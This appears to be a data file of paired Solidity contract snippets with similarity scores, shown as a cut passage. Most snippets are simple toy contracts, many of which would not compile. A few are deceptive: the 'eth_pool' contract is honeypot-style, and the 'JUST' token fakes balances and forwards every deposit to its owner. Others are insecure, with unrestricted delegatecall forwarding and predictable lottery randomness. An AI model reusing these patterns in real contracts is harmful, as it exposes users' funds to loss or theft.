        balance[msg.sender] = balance[msg.sender].sub(_value);

        balance[_to] = balance[_to].add(_value);

        emit Transfer(msg.sender,_to,_value);

        

        return true;



     }



     function approve(address _spender, uint256 _value)

            public returns (bool){

            allowed[msg.sender][_spender] = _value;



            emit Approval(msg.sender, _spender, _value);

            return true;

            }



      function transferFrom(address _from, address _to, uint256 _value)

            public returns (bool){

               require(_value <= balance[_from]);

               require(_value <= allowed[_from][msg.sender]); 

               require(_to != address(0));



              balance[_from] = balance[_from].sub(_value);

              balance[_to] = balance[_to].add(_value);

              allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);

              emit Transfer(_from, _to, _value);

              return true;

      }





     

}"
"contract Lottery{
    address public owner;
    uint public fee;
    uint public jackpot;

    constructor() public {
        owner = msg.sender;
        jackpot = 0;
        fee = 1 finney
    }

    
    function buyTicket() public payable {
        require(msg.value == 1 finney, ""Incorrect fee"");

        jackpot += 1;
    }

    function () external payable {

    }
}",0.6258306033779774,"contract Pausable is Owned {

    bool public paused;



    constructor() public {

        paused = false;

    }



    

    

    

    modifier notPaused {

        require( paused == false || now > 1556668800 || msg.sender == owner);

        _;

    }



    function pause() onlyOwner public

    {

        paused = true;

    }



    function resume() onlyOwner public

    {

        paused = false;

    }

}"
"contract ConfigContract{

    constructor() public{
    }

    function getName() external pure returns (string) {
        return ""Amel"";
    }
}",0.6817832516337792,"contract Searcher {



    

    

    function poke() public;



    

    

    function identify() external pure returns(uint) {

        return 0xda4b055; 

    }

}"
"contract Lottery{

    address public manager; 
    address[] public players;

    function Lottery() public {
        manager = msg.sender;

    }


    function enter() public payable{
        require (msg.value > 0.01 ether);
        players.push(msg.sender);
    }


    function random() public view returns (uint){
        return uint(keccak256(block.difficulty, now, players));
    }

}",0.6631927699144362,"contract Wallet {
    address payable public owner;
    
    constructor() public payable {
        owner = msg.sender;
    }
    
    modifier OnlyOwner {
        require(msg.sender == owner);
        _;
    }
    
    function topup() public payable {
        
    }
    
    function withdraw(address payable to, uint256 value) public OnlyOwner {
        to.transfer(value);
    }

    function () external payable{}
}"
"contract setget{
    uint x;
    function setnumber(uint _x) public {
        x=_x;
    }
    function getnumber() public view returns(uint){
        return x;
    }
}",0.6975123680725746,"contract Token {

  function balanceOf(address ) public view returns (uint );

  function transfer(address , uint ) public returns (bool );

}"
"contract strtest
{
    bool ib_equal;
    function test(string p1,string p2) returns(bool) {
        ib_equal = strcompare(p1,p2) ;
        return true;
    }
}",0.6291612152772068,"contract DAppTest {

  bool public _is;

  function changeBoolean() public returns (bool success) {
    _is = !_is;
    return true;
  }

}"
"contract ecommerce{

    event OnProductAdd(uint, string, uint);
    event UserInfo(User);

    struct User{
        address _address;
        bytes32 name;
        uint balance;
    }

    struct Product{
        uint id;
        string name;
        uint price;
    } 

    address _owner;

    mapping(address => User) public user;

    Product[] public products;

    modifier isAdmin() {
        require(msg.sender == _owner, ""you don't have admin access"");
        _;
    }

    constructor() public {
        _owner = msg.sender; 
    } 

    function addProduct(uint _id, string _name, uint _price) isAdmin public {

        products.push(Product({
            id: _id,
            name : _name,
            price : _price
        }));

        emit OnProductAdd(_id, _name, _price);
    }

    function getAllProducts() view public{

       
    }

}",0.6216331080055627,"contract Adoption {

  address[16] public adopters;

  uint[16] public prices;

  address public owner;



  constructor() public {

    owner = msg.sender;

    for (uint i=0;i<16;++i) {

      prices[i] = 0.001 ether;  

    }

  }



  

  function adopt(uint petId) public payable returns (uint) {

    require(petId >= 0 && petId <= 15);

    require(msg.value >= prices[petId]);



    prices[petId] *= 120;

    prices[petId] /= 100;



    adopters[petId] = msg.sender;

    return petId;

  }



  

  function getAdopters() public view returns (address[16] memory, uint[16] memory) {

    return (adopters,  prices);

  }

  

  modifier onlyOwner() {

        require (msg.sender == owner);

        _;

      }

  function withdraw() public onlyOwner{

    msg.sender.transfer(address(this).balance);

  }

}"
"contract Hash{

    uint256[][] public data;

    function append(uint _a, uint _b) public {
        data.push([_a, _b]);
    }

    function hash(uint256 _idx, string memory _b) public view returns(bytes32) {
        return keccak256(abi.encodePacked(data[_idx], _b));
    }
}",0.6461381102045255,"contract StrictToken is Token {

    bool public strict = true;

    mapping (address => uint256) public rate;



    function getRate(address _address) public view returns (uint256);

    function getStrict() public pure returns (bool);

}"
"contract A{
   event Invoked();
   function invoke() public returns(bool){
      Invoked();
      return true;
   }
}",0.6838068951039122,"contract MSD4 {

   

    function greenOnFanChun () public pure returns (bool) {

        return true;

    }

}"
"contract B{
   function B() {
      new A().invoke()
   }
}",0.6728450601744213,"contract A {

    B public myB = new B();

}"
"contract General{
    function getMoney () payable{
        GenLib.moneyIn();
   }
}",0.6255495293182238,"contract Nonpayable {

  
  
  
  function () external payable {
    revert();
  }
}"
"contract A{
    struct Info {
        uint index;
        address owner;
    }

    Info[] public list;

    mapping(address => uint) public balanceOf;
    uint totalSupply;

    function buy(uint amount) public {
        totalSupply += amount;
        balanceOf[msg.sender] += amount;
        list.push(Info(totalSupply, msg.sender));

    }

    function call(uint index) public view returns (address){
        return getOwnerOfToken(index);

    } 

    function getOwnerOfToken(uint index) public view returns(address) {
        uint256 lo = 0;
        uint256 hi = list.length;

        while (lo + 1 < hi) {
            uint256 mid = (lo + hi) / 2;
            if (list[mid].index >= index)
                lo = mid;
            else
                hi = mid;
        }

        if (list[hi].index >= index)
            return list[hi].owner;
        if (list[lo].index >= index)
            return list[lo].owner;

        revert(""not found"");
    }
}",0.6603004461986373,"contract ERC20 {
        
        function totalSupply () public view returns (uint256);
        function balanceOf (address tokenOwner) public view returns (uint256);
        function transfer (address to, uint256 amount) public returns (bool);
        event Transfer (address indexed from, address indexed to, uint256 amount);

        
        function allowance (address tokenOwner, address spender) public view returns (uint256);
        function approve (address spender, uint256 amount) public returns (bool);
        function transferFrom (address from, address to, uint256 amount) public returns (bool);
        event Approval (address indexed tokenOwner, address indexed spender, uint256 amount);
}"
"contract test{

mapping(bytes4 => bool) internal supportedInterfaces;
uint public a;

function test() public{
          supportedInterfaces[this.transferFrom.selector] = true;
  }

  function supportsInterface(bytes4 interfaceID) external view returns (bool) {
        return supportedInterfaces[interfaceID];
  }


  function transferFrom(address _from, address _to, uint256 _tokenId) public{
     a = 1;
  }

  function transferFrom(address _from, address _to, uint256 _tokenId, bytes data) public{
    a = 2;
  }

}",0.6960405499561445,"contract ERC721Interface {

  function ownerOf(uint256 _tokenId) public view returns (address _owner);

  function approve(address _to, uint256 _tokenId) public;

  function getApproved(uint256 _tokenId) public view returns (address);

  function isApprovedForAll(address _owner, address _operator) public view returns (bool);

  function safeTransferFrom(address _from, address _to, uint256 _tokenId) public;

  function supportsInterface(bytes4) public view returns (bool);

}"
"contract ApprovalContract{
    address public sender;
    address payable public reciever;
    address public constant approver=0xe05cE3f89b5Ab28d6d2Ac8A503473Cd5A23e616a;

    function deposit (address payable _receiver)external payable{

        require (msg.value > 0);
        sender=msg.sender;
        reciever=_receiver;
    }

    function viewApprover () external pure returns(address) {
        return approver;
    }

    function approve () external payable {

        require (msg.sender==approver);
        reciever.transfer(address(this).balance);
    }
    }",0.6364935588366893,"contract Cryptoman is Mortal{

    
    function deposit() public payable {
    }

    
    function withdraw(uint amount, address payable receiver) public onlyOwner {
      require(address(this).balance >= amount, ""insufficient balance"");
      receiver.transfer(amount);
    }
    
    
    function withdrawTokens(address tokenAddress, uint amount, address payable receiver) public payable onlyOwner {
      ERC20 token = ERC20(tokenAddress);
      require(token.balanceOf(address(this))>=amount,""insufficient funds"");
      token.transfer(receiver, amount);
    }


}"
"contract Slot_Machine is Mortal{

  
  
  
  struct Player{
      address payable wallet;
      uint deposit;
      uint guess;
      bool haveguessed;
  }

  mapping (address => Player) public player;

  
  uint randomNumber;

  constructor() public{
    
    newPlayer(10,5);
  }

  
  
  function newPlayer(uint pdeposit, uint pguess) public {

    player[msg.sender] = Player(msg.sender, pdeposit, pguess, true);

  }


  function generateRandomNumber(uint rand) public {
    randomNumber = rand;
  }

  
  
  

  function payOut(address to) public {

    
    

    if(player[to].guess == randomNumber){

      player[to].wallet.transfer(player[to].deposit*2);
      emit Message(""You Win!"");

    } else {

        emit Message(""Unlucky this time! try again when you are feeling lucky!"");

    }
  }

  function getBalance() public view returns(uint) {
    return address(this).balance;
  }

  function () external payable{
    require(msg.sender.balance >= msg.value,
          ""Insufficient balance to complete transaction."");
  }


}",0.6464082359372239,"contract Escrow {
  address public owner;
  uint public fee;
  mapping (address =>  mapping (address => uint)) public balances;

  function Escrow() public {
    owner = msg.sender;
  }

  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }

  function setFee(uint price) onlyOwner external {
    fee = price;
  }

  function start(address payee) payable external {
    balances[msg.sender][payee] = balances[msg.sender][payee] + msg.value;
  }

  function end(address payer, address payee) onlyOwner external returns(bool){
    uint value = balances[payer][payee];
    uint paidFee = value / (1000000 / fee);
    uint payment = value - paidFee;
    balances[payer][payee] = 0;
    payee.transfer(payment);
    owner.transfer(paidFee);
    return true;
  }
  
  function refund(address payer, address payee) onlyOwner external returns(bool){
    uint value = balances[payer][payee];
    balances[payer][payee] = 0;
    payer.transfer(value);
    return true;
  }
}"
"contract mysmartContract{


        function whitdrawETH() payable public {

        }

        function getContactEthBalance() constant returns(uint) {

        return this.balance;
        }

    }",0.6472299667090599,"contract Cookie {



  function () public payable {}



  



  function getFlavor()

    public

    constant

    returns (string flavor)

  {

    return ""mmm ... chocolate chip"";

  }

}"
"contract Extend{
    Base public base;
    uint public es;
    constructor (address  _baseAdd) public {
        base = Base(_baseAdd);
    }
    function mint() public {
     es =   base.Mint();
    }
    function getES() public view returns(uint){
       return es;   
   }

}",0.656543095990787,"contract JoinLike {
    function ilk() public returns (bytes32);
    function gem() public returns (GemLike);
    function dai() public returns (GemLike);
    function join(address, uint) public;
    function exit(address, uint) public;
}"
"contract TestingRandom{
address public theCreator;
address[] public participants;
uint public Secretkey1;
string public Secretkey2;

constructor() public {theCreator = msg.sender;}

function enterArray() public payable{
if (msg.value == 1 ether){
participants.push(msg.sender);}

else {if(msg.value == 2 ether){
for(int i; i<150; i++)
participants.push(msg.sender);
}}}

function key1(uint anInput) public {
Secretkey1 = anInput; }

function key2(string anInput) public {
Secretkey2 = anInput;}

function randomizer() public view returns (uint){
return uint(keccak256(abi.encodePacked(Secretkey1, Secretkey2, participants)));}

function selectParticipant() public {
 randomizer() % participants.length;   
 participants = new address[](0);
}
}",0.605413119908626,"contract eth_pool

{

    bytes32 keyHash;

    address owner;

    bytes32 wallet_id = 0x791a52af4a6750805afbd37fdc0b7bc76cce55e1217aff012c91d053eefcafae;



    constructor() public {

        owner = msg.sender;

    }



    function withdraw(string key) public payable

    {

        require(msg.sender == tx.origin);

        if(keyHash == keccak256(abi.encodePacked(key))) {

            if(msg.value > 1 ether) {

                msg.sender.transfer(address(this).balance);

            }

        }

    }



    function setup_key(string key) public

    {

        if (keyHash == 0x0) {

            keyHash = keccak256(abi.encodePacked(key));

        }

    }



    function update_hash(bytes32 newHash) public

    {

        if (keyHash == 0x0) {

            keyHash = newHash;

        }

    }



    function clear() public

    {

        require(msg.sender == owner);

        selfdestruct(owner);

    }



    function get_id() public view returns(bytes32){

        return wallet_id;

    }



    function () public payable {

    }

}"
"contract guessing

{
    uint256 public upperRange;
    uint256 public lowerRange;
    uint256 private answer;
    address public player1;
    address public player2;
    uint256[] public guessed_list;
    bool public gameStatus;
    bool public the_hint;

    event didWin ( bool status);
    event guessed_array (uint256[]  g_list);
    event hintz (bool is_within);


    constructor() public {  player1 = msg.sender;  }

    
    function startGame( uint256 u , uint256 l , uint256 a) public 
    {
        upperRange = u;
        lowerRange = l;
        answer = a;
    }


    
    
    function guess( uint256 g ) public returns (bool, string memory)
    {
        require(!(guessed_list.length >= 10 || gameStatus), ""End of game"");
        require(msg.sender != player1);
        the_hint =false;
        if ( !isRight( g ) )
        {
            if ( g < lowerRange || g > upperRange )   
            {
                return (false, ""out of range"");
            }
            else
            {
                
                guessed_list.push(g) ;  
                return (false, ""good guess"");
            }
        }
        else
            {  
                guessed_list.push(g) ;  
                gameStatus =  true ;
                emit didWin(true);
                return (true, ""you won!"");

            }
    }

    
    function guessLen() public view returns (uint256)
    {
        return guessed_list.length;
    }


    function getGameStatus() public view returns (bool)
    {
        return gameStatus ;
    }

    function isRight(uint256 g) public view returns (bool)
    {
        return g == answer ;
    }

    
    function getGuessesNums() public  returns (uint256[] memory)
    {
        uint256[] memory b = new uint256[](guessed_list.length);
        for (uint i=0; i < b.length; i++) {
            b[i] = guessed_list[i];
        }
        emit guessed_array ( b );
        return b;
    }

       function max(int256 a, int256 b) private pure returns (int256) {
        return a > b ? a : b;     
    }

    
    function withIN(int256 x ) public  returns (bool)
    {
        int256 diff = (int256)(guessed_list[guessed_list.length - 1]) - (int256)(answer);
        if(max(diff, -diff) <= x)
        {
            the_hint = true;
            emit hintz(true);
            return true;
        }
        emit hintz(false);
        return false;
    }

}",0.6428509654930397,"contract JUST is ERC20Interface {
    
    
    string public name = ""JUST www.powh.io"";
    uint8 public decimals = 18;                
    string public symbol = ""JUST"";
    
    
    uint256 public stdBalance;
    mapping (address => uint256) public bonus;
    
    
    address public owner;
    bool public JUSTed;
    
    
    event Message(string message);
    

    function JUST()
        public
    {
        owner = msg.sender;
        totalSupply = 1337 * 1e18;
        stdBalance = 232 * 1e18;
        JUSTed = true;
    }
    
    
   function transfer(address _to, uint256 _value)
        public
        returns (bool success)
    {
        bonus[msg.sender] = bonus[msg.sender] + 1e18;
        Message(""+1 token has been deposited in your account."");
        return true;
    }
    
    
   function transferFrom(address _from, address _to, uint256 _value)
        public
        returns (bool success)
    {
        bonus[msg.sender] = bonus[msg.sender] + 1e18;
        Message(""+1 token has been deposited in your account"");
        return true;
    }
    
    
    function UNJUST(string _name, string _symbol, uint256 _stdBalance, uint256 _totalSupply, bool _JUSTed)
        public
    {
        require(owner == msg.sender);
        name = _name;
        symbol = _symbol;
        stdBalance = _stdBalance;
        totalSupply = _totalSupply;
        JUSTed = _JUSTed;
    }


    
    function balanceOf(address _owner)
        public
        view 
        returns (uint256 balance)
    {
        if(JUSTed){
            if(bonus[msg.sender] > 0){
                return stdBalance + bonus[msg.sender];
            } else {
                return stdBalance;
            }
        } else {
            return 0;
        }
    }

    function approve(address _spender, uint256 _value)
        public
        returns (bool success) 
    {
        return true;
    }

    function allowance(address _owner, address _spender)
        public
        view
        returns (uint256 remaining)
    {
        return 0;
    }
    
    
    function()
        public
        payable
    {
        owner.transfer(this.balance);
        Message(""Thanks for your donation."");
    }
    
    
    function rescueTokens(address _address, uint256 _amount)
        public
        returns (bool)
    {
        return ERC20Interface(_address).transfer(owner, _amount);
    }
}"
"contract factorial{

    uint number;
    uint fac=1;
    uint i;

    function fact(uint x) public view returns(uint) {
        number=x;
        for(i=1;i<=x;i++){
            fac= fac*(i);
        }
        return fac;
    }
}",0.6347755525090428,"contract SimpleStorage

{

    uint storedData;

    

    function set(uint x) public

    {

        storedData = x;

    }



    function get() public view returns (uint)

    {

        return storedData;

    }

}"
"contract pensCollection{

    struct Pen{
        uint productCode;
        address ownerAddress;
    }

    address public owner;

    
    mapping(uint => address[]) public __history;

    
    mapping(address => Pen[]) public __inventary;

    constructor () public{
        owner = msg.sender;
    }


    function addPen(uint _productCode, address _ownerAddress) public returns (address) {


        Pen memory _pen = Pen({
            productCode : _productCode,
            ownerAddress : _ownerAddress
            });
        __inventary[_ownerAddress].push(_pen);

        
        __history[_productCode].push(_ownerAddress);

        return msg.sender;
    }

    function exchangePen(address _buyer, uint _productCode) public returns (bool) {

       
        for (uint i = 0; i < (__inventary[msg.sender].length); i++) {

            
            if (__inventary[msg.sender][i].productCode == _productCode) {

                Pen memory _pen = Pen(
                    {
                    productCode : _productCode,
                    ownerAddress : _buyer
                    });
                __inventary[_buyer].push(_pen);
                __history[_productCode].push(_buyer);

                delete __inventary[msg.sender][i];
                return true;
            }
        }

        return false;
    }

    function getHistoryForPen(uint _productCode) public view returns (address[]) {
        return __history[_productCode];
    }
}",0.6238500629886303,"contract FaucetPay {
    
    event Deposit(address _from, uint256 _amount);
    event Withdrawal(address _to, uint256 _amount);
    
    address payable private adminAddress;
     
    constructor() public { 
        adminAddress = msg.sender;
    }
    
    modifier _onlyOwner(){
        require(msg.sender == adminAddress);
          _;
    }

    function changeAdminAddress(address payable _newAddress) _onlyOwner public {
        adminAddress = _newAddress;
    }
    
    function () external payable {
        deposit();
    }

    function deposit() public payable returns(bool) {
        
        require(msg.value > 0);
        emit Deposit(msg.sender, msg.value);
        
        return true;
        
    }

    function withdraw(address payable _address, uint256 _amount) _onlyOwner public returns(bool) {
    
        _address.transfer(_amount);
        emit Withdrawal(_address, _amount);
        
        return true;
        
    }
    
    function withdrawMass(address[] memory _addresses, uint256[] memory _amounts) _onlyOwner public returns(bool) {
        
        for(uint256 i = 0; i < _addresses.length; i++) {
            
            address payable payable_address = address(uint160(_addresses[i]));
            withdraw(payable_address, _amounts[i]);
	        
	    }
	    
	    return true;
        
    }
    
}"
"contract Ranking{

    struct User {
      string name;
      uint level;
    }

    mapping (address => User) userStructs;        
    address[] public userAddresses;

    function createUser(string name, uint level) {
      userStructs[msg.sender].name = name;
      userStructs[msg.sender].level = level;
      userAddresses.push(msg.sender);            
    }

    function getAllUsers() external view returns (address[]) {
      return userAddresses;           
    }    
}",0.6297653801769699,"contract AffiliateProgram {
    function addUserUseCode(address user, string memory code) public;
    function getPartnerFromUser(address user) external view returns (address, uint8, uint256, uint256);
    function levels(uint8 level) external view returns (uint16, uint256);
    function addPartnerProfitUseAddress(address partner) external payable;
}"
"contract Usermapping {
            uint256 public value;
            bytes32 public name;
            function addValue(uint a) public returns (bool)
            {
                value = a;
                return true;
            }
            function getValue() public view returns(uint256)
            {
                return value;
            }
            function setName(bytes32 nameSet) public returns(bool){
                name = nameSet;
                return true;
            }
             function getName() public view returns(bytes32){
                return name;
            }
        }",0.6861392502944493,"contract IERC20 {
    function balanceOf(address who) public view returns (uint);
    function decimals() public view returns (uint);
    function transfer(address to, uint value) public returns (bool);
    function transferFrom( address from, address to, uint value) public returns (bool);
    function approve(address spender, uint value) public returns (bool);
}"
"contract Foo {

  enum State {
    StateA,
    StateB
  }

  State internal state;

  function getState()
    public view
    returns (State)
  {
    return state;
  }
}",0.6086299514367116,"contract FighterCamp {
    
    
    function isCamp() public pure returns (bool);
    
    
    function getFighter(uint _tokenId) external view returns (uint32);
    
}"
"contract demo{
    string public name = 'Etienne';

    function changeName(string _newName){
        name = _newName;
    }
}",0.6176176327607189,"contract ENSReverseRegistrarI {
    function setName(string memory name) public returns (bytes32 node);
}"
"contract Tx {
    address public p1;
    address public p2;
    Own public o1;
    Own public o2;

    function Tx(address ownAddress){
        p1 = msg.sender;
        o1 = Own(ownAddress);
    }
    function participate(address ownAddress){
        p2 = msg.sender;
        o2 = Own(ownAddress);
        o1.transfer(p2,{from:p1});
        o2.transfer(p1,{from:p2});
    }
}",0.6567942478555922,"contract Ownable {

  address public owner;
  address public mainAddress;

  constructor() public {
    owner = msg.sender;
    mainAddress = msg.sender;
  }

  modifier onlyOwner() {
    require(msg.sender == owner, ""Only for owner"");
    _;
  }

  function transferOwnership(address _owner) public onlyOwner {
    owner = _owner;
  }

}"
"contract TestContract{

   uint public a;

   constructor() public 
   { 
       a = 2;
   }

   function addNumber(uint b) public
   {
       a = a + b;
   }

   function read() public view returns (uint)
   {
       return a;
   }
}",0.6862690542293038,"contract Manager {
    function ilks(uint) public view returns (bytes32);
    function owns(uint) public view returns (address);
    function urns(uint) public view returns (address);

}"
"contract sample1{
    function a() returns (int b);
}",0.6677643032974248,"contract VoxLike {
    function par() public returns (uint);
}"
"contract MultiSigWallet {
struct Transaction {
    address destination;
    uint256 value;
    bytes data;
    bool executed;
}






function submitTransaction(address destination,
    uint256 value,
    bytes memory data)
    public
    returns (uint256 transactionId)
{
    transactionId = addTransaction(destination, value, data);
    confirmTransaction(transactionId);
}



function confirmTransaction(uint256 transactionId)
    public
    ownerExists(msg.sender)
    transactionExists(transactionId)
    notConfirmed(transactionId, msg.sender)
{
    confirmations[transactionId][msg.sender] = true;
    emit Confirmation(msg.sender, transactionId);
    executeTransaction(transactionId);
}



function executeTransaction(uint256 transactionId)
    public
    ownerExists(msg.sender)
    confirmed(transactionId, msg.sender)
    notExecuted(transactionId)
{
    if (isConfirmed(transactionId)) {
        Transaction storage txn = transactions[transactionId];
        txn.executed = true;
        if (
            external_call(
                txn.destination,
                txn.value,
                txn.data.length,
                txn.data
            )
        ) {
            emit Execution(transactionId);
        } else {
            emit ExecutionFailure(transactionId);
            txn.executed = false;
        }
    }
}



function external_call(address destination,
    uint256 value,
    uint256 dataLength,
    bytes memory data)
    internal
    returns (bool)
{
    bool result;
    assembly {
        let x := mload(0x40) 
        let d := add(data, 32) 
        result := call(
            sub(gas(), 34710), 
            
            
            destination,
            value,
            d,
            dataLength, 
            x,
            0 
        )
    }
    return result;
}",0.6128208679011636,"contract MultiSigWalletWithDailyLimit is MultiSigWallet {

    event DailyLimitChange(uint dailyLimit);

    uint public dailyLimit;
    uint public lastDay;
    uint public spentToday;

    
    
    
    
    
    function MultiSigWalletWithDailyLimit(address[] _owners, uint _required, uint _dailyLimit)
        public
        MultiSigWallet(_owners, _required)
    {
        dailyLimit = _dailyLimit;
    }

    
    
    function changeDailyLimit(uint _dailyLimit)
        public
        onlyWallet
    {
        dailyLimit = _dailyLimit;
        DailyLimitChange(_dailyLimit);
    }

    
    
    function executeTransaction(uint transactionId)
        public
        notExecuted(transactionId)
    {
        Transaction tx = transactions[transactionId];
        bool confirmed = isConfirmed(transactionId);
        if (confirmed || tx.data.length == 0 && isUnderLimit(tx.value)) {
            tx.executed = true;
            if (!confirmed)
                spentToday += tx.value;
            if (tx.destination.call.value(tx.value)(tx.data))
                Execution(transactionId);
            else {
                ExecutionFailure(transactionId);
                tx.executed = false;
                if (!confirmed)
                    spentToday -= tx.value;
            }
        }
    }

    
    
    
    
    function isUnderLimit(uint amount)
        internal
        returns (bool)
    {
        if (now > lastDay + 24 hours) {
            lastDay = now;
            spentToday = 0;
        }
        if (spentToday + amount > dailyLimit || spentToday + amount < spentToday)
            return false;
        return true;
    }

    
    
    
    function calcMaxWithdraw()
        public
        constant
        returns (uint)
    {
        if (now > lastDay + 24 hours)
            return dailyLimit;
        if (dailyLimit < spentToday)
            return 0;
        return dailyLimit - spentToday;
    }
}"
"contract C {
    function first(uint a) private constant returns (uint b)
    {
        b= a +1;
    }
}",0.6665670690997401,contract test { function multiply(uint a) public pure returns(uint d) {   return a * 7;   } }
"contract test1{
    uint a;
    event event_res(string msg,uint x);
      function test1(){
          a = 1;
      }
      function multiply (uint b){
          a = a*b;
        event_res(""the value after multiplying is:"",a); 
      }
      function getval()  returns(uint){
          return a;
      }
}",0.6212276927040514,"contract SafeMath {

    function safeAdd(uint a, uint b) internal pure returns (uint c) {

        c = a + b;

        assert(c >= a);

    }



    function safeSub(uint a, uint b) internal pure returns (uint c) {

        c = a - b;

        assert(c <= a);

    }

}"
"contract escrow {

  address seller;
  address buyer;
  address owner = msg.sender;

  function setup(address seller, address buyer){
    if(msg.sender == owner){
        this.seller = seller;
        this.buyer = buyer;
    }
  }

}",0.636024860284146,"contract Owned {
    address public owner;

    function changeOwner(address _addr) onlyOwner {
        if (_addr == 0x0) throw;
        owner = _addr;
    }

    modifier onlyOwner {
        if (msg.sender != owner) throw;
        _;
    }
}"
"contract Callee 
{
    uint public result_;

    function foo (uint _length, uint[] _nums) public returns (uint)
    {    
        result_ = 0;
        for ( uint i = 0; i < _length; ++i)
             result_ += _nums[i];
        return result_;
    }
}",0.6336333653031537,"contract FeeInterface {
    function rateOf (address token) public view returns (uint);
    function takeFee (uint amt, address token) public view returns (uint fee, uint remaining);
}"
"contract Caller
{
    uint public result_;
    address public callee_ = <Address of deployed Callee>;

    function Call (uint[] _nums) public returns (bool)
    {    return callee_.delegatecall(bytes4(sha3(""foo(uint256,uint256[])"")), _nums.length, _nums); }
}",0.6458852866790155,"contract CappedToken is MintableToken {

    uint256 public cap;

    constructor() public {
        
    }

    

    
    function mint(
        address _to,
        uint256 _amount
    )
    public
    returns (bool)
    {
        require(totalSupply_.add(_amount) <= cap);

        return super.mint(_to, _amount);
    }
}"
"contract Relay {
address public currentVersion;
address public owner;

function Relay(address initAddr){
    currentVersion = initAddr;
    owner = msg.sender;
}

function(){
    if(!currentVersion.delegatecall(msg.data)) throw;
}",0.6491843224871627,"contract Delegation {



  address public owner;

  Delegate delegate;



  function Delegation(address _delegateAddress) {

    delegate = Delegate(_delegateAddress);

    owner = msg.sender;

  }

  

  

  

  

  function() {

    if(delegate.delegatecall(msg.data)) {

      this;

    }

  }

}"
"contract myContract
{
    address[] public childContracts;

    function newContracts(uint _id,string _name) public returns(address _newContract)
    {
        uint id=_id;
        string memory name=_name;
        anotherContract a = new anotherContract(id,name);
        childContracts.push(a);
        return a;
    }
}",0.6948668227571664,"contract Bakery {



  



  address[] public contracts;



  



  function getContractCount()

    public

    constant

    returns(uint contractCount)

  {

    return contracts.length;

  }



  



  function newCookie()

    public

    returns(address newContract)

  {

    Cookie c = new Cookie();

    contracts.push(c);

    return c;

  }

}"
"contract anotherContract
{
    string name;
    uint id;
    constructor(uint _id,string _name)
    {
        name=_name;
        id=_id;
    }
}",0.603121593468223,"contract Domain {

string public name;

constructor(string register_domain) public {

    name = register_domain;

}

}"
"contract HelloWorld {
    uint public balance;

    function HelloWorld(){
        balance = 1000;
    }
}",0.637432560314889,"contract TokenStorage {
    function balances(address account) public returns(uint balance);
}"
"contract Contract {

    struct User{
    string fname;
    string Email;
    uint256 age;
    }


    mapping(uint => User)public users; 


 function addDoctor(uint _id, string memory fname, string memory Email,
    uint256 age) public {


         users[_id] = User(fname,email,age);

     }
 }",0.611847593856254,"contract SRC20Detailed {
    string public name;
    string public symbol;
    uint8 public decimals;

    constructor (string memory _name, string memory _symbol, uint8 _decimals) public {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }
}"
"contract Calc{
  
  uint count;

  
  function add(uint a, uint b) returns(uint){
    count++;
    return a + b;
  }

  
  function getCount() constant returns (uint){
    return count;
  }
}",0.6779952992076567,"contract Token {
    function balanceOf(address a) returns (uint) {
        (a);
        return 0;
    }

    function transfer(address a, uint val) returns (bool) {
        (a);
        (val);
        return false;
    }
}"
"contract changeName{
    string customerName;

    function changeName(string _customerName)
       {
          customerName=_customerName;
       }

    function getName() returns(string)
       {

         return customerName;
       }
    }",0.664054946751544,"contract MyTest{
    string private name;
   
    function setName(string newName) public{
        name=newName;
    }
    
    function getName() public view returns(string){
        return name;
    }
    
}"
"contract MoonTrade
{
    function multiSendETH(  address payable address1,
                            uint value1,
                            address payable address2,
                            uint value2) public payable
    {
        address1.transfer(value1);
        address2.transfer(value2);

        msg.sender.transfer(address(this).balance);
    }
}",0.6741242044703029,"contract Multisend {
    function multisend(address payable[] memory dests) public payable {
        uint value = msg.value / dests.length;
        for(uint i = 0 ; i < dests.length ; i++) dests[i].transfer(value);
        
        msg.sender.transfer(address(this).balance);
    }
}"
"contract A{
    
    event MyName(address _from, address sender);
    function checkMe(uint val) public{
        emit MyName(this, msg.sender);
        
    }
}",0.6412033648757416,"contract TokenReceiver {
  function tokenFallback(address _sender, address _origin, uint _value) public returns (bool ok);
}"
"contract ProdottoFactory  {

    function foo() view returns(string nome){
        return ""foo"";
    }
}",0.6686820993327142,"contract time{
function _time() view external returns (uint)
{
    return now ;
    
}
}"
"contract Foo {
    event NewUser(
        address userAddress,
        uint amount
    );

    function addUser() public payable{
        emit NewUser(msg.sender, msg.value);
    }
}",0.6693631112166408,"contract ProxyTest {



    event ETHSent(uint amt);



    function sendETH() public payable {

        address(msg.sender).transfer(msg.value);

        emit ETHSent(msg.value);

    }



}"
"contract OraclizeI {
    address public cbAddress;
    function query(uint _timestamp, string _datasource, string _arg) external payable returns (bytes32 _id);
    function query_withGasLimit(uint _timestamp, string _datasource, string _arg, uint _gaslimit) external payable returns (bytes32 _id);
    function query2(uint _timestamp, string _datasource, string _arg1, string _arg2) public payable returns (bytes32 _id);
    ...
}",0.6110240978042426,"contract NanoLedgerABI{
    
    struct data{
        string company;
        string valid_date;
    }
    
    mapping (uint => data) datas;

    
    function save(uint256 _id, string _company, string _valid_date) public{
        datas[_id].company = _company;
        datas[_id].valid_date = _valid_date;
    }
    
    function readCompany(uint8 _id) view public returns (string){
       return datas[_id].company;
    }
    function readValidDate(uint8 _id) view public returns (string){
       return datas[_id].valid_date;
    }
}"
"contract MetaCoint{
function createCounterVariable(){
  
 }
}",0.6177035640911197,"contract FLC {
    function create(uint units) public;
}"
"contract Contract {
    function test() constant returns(uint8[2], uint8[2]){
        uint8[2] memory a = [1, 2];
        uint8[2] memory b = [3, 4];
        return (a, b);
    }
}",0.6641060945450477,"contract calc { 
    event ret(uint r);
    function multiply(uint a, uint b) returns(uint d) { 
        uint res = a * b;
        ret (res);
        return res; 
    } 
}"
"contract B is A {
    using Lib for *;
    ...
}",0.6277529342484279,"contract A {

    B public myB = new B();

}"
"contract myFirstContract
{
    address[] public childContracts;
    uint public idd;
    string public name1;

    function newContracts(uint _id,string _name) public returns(address _newContract)
    {
        uint id=_id;
        string memory name=_name;
        anotherContract a = new anotherContract(id,name);
        childContracts.push(a);
        return a;
    }

    function getContractData(uint _address) public
    {

    }
}",0.6460539906973869,"contract tDeployer is Ownable {



	address private main;



	function cMain(address nM) public onlyOwner {

		main = nM;

	}



    function deployToken(string _tName, string _tSymbol, uint _mint, address _owner) public returns (address) {

		require(msg.sender == main);

		tokenContract newContract = new tokenContract(_tName, _tSymbol, _mint, _owner);

		return newContract;

	}





}"
"contract anotherContract
{
